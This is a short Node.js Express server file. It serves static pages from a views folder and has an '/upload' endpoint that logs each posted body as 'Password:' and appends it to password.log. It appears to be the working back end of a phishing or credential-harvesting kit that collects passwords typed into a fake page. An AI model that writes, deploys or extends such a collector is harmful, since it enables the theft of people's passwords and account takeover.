const express = require('express')
const fs = require('fs')

const app = express()
app.use(express.static('./views'))

app.use('/upload', express.text(), (req, res) => {
  console.log('Password:', req.body)
  fs.appendFileSync('./password.log', req.body + '\n\n')
  res.end()
})

app.listen(80, () => {
  console.clear()
  console.log("Server started...")  
})